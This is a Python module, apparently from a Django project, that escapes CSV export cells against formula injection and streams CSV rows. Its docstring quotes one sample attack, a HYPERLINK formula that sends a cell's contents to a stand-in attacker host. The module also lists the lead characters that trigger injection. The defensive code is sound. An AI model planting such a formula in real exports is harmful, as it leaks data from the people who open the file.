"""CSV-injection mitigation for any value we write into a CSV export.

If a CSV cell starts with ``=``, ``+``, ``-``, ``@``, ``\\t`` or ``\\r``,
Excel / LibreOffice / Google Sheets treats it as a formula on open. An
attacker who controls any free-text field that ends up in an export
(article name, member note, account holder, etc.) can ship
``=HYPERLINK("http://attacker/?leak="&A2,"Open")`` or worse and get
office staff to execute it just by opening the file.

The OWASP-canonical fix is to prefix the offending cell with a single
quote ``'``. Excel hides that quote on open and stops interpreting the
rest as a formula. We do this for *every* string cell rather than try
to enumerate which fields are user-supplied — the cost is one
comparison + at most one prepend per cell, and we lose nothing by
being uniform.

Wire-in pattern (replace ``writer.writerow([...])`` with
``writer.writerow(escape_csv_row([...]))``):

.. code-block:: python

    from apps.shared.csv_safety import escape_csv_row

    writer = csv.writer(buf, delimiter=";")
    writer.writerow(escape_csv_row(["Name", "Note", "Amount"]))
    for row in rows:
        writer.writerow(escape_csv_row([row.name, row.note, row.amount]))

Non-string cells (Decimal, int, date) are returned unchanged — they
can't start with a dangerous lead character without first being
``str()``-ed, which Python's csv module does on write. The check here
is conservative: we only inspect actual ``str`` instances.
"""

from __future__ import annotations

from collections.abc import Iterable
from typing import Any

# OWASP CSV-injection lead characters. ``\t`` and ``\r`` matter because
# Excel re-interprets some leading whitespace as cell-internal triggers.
_DANGEROUS_LEAD = ("=", "+", "-", "@", "\t", "\r")


def escape_csv_cell(value: Any) -> Any:
    """Return ``value`` with a leading ``'`` if it starts with a CSV-injection
    trigger char, otherwise unchanged."""
    if isinstance(value, str) and value.startswith(_DANGEROUS_LEAD):
        return "'" + value
    return value


def escape_csv_row(row: Iterable[Any]) -> list[Any]:
    """Apply :func:`escape_csv_cell` to every cell in ``row``."""
    return [escape_csv_cell(cell) for cell in row]


class CsvEchoBuffer:
    """Minimal file-like sink for ``csv.writer`` whose ``write`` returns the
    line instead of buffering it.

    Pairs with :class:`django.http.StreamingHttpResponse` to stream a CSV
    row-by-row (``yield writer.writerow(...)``) instead of accumulating the
    whole document in a ``StringIO`` and sending it in one shot — the classic
    Django streaming-CSV pattern. Keeps memory flat and improves time-to-first-
    byte on large exports.
    """

    def write(self, value: str) -> str:
        return value
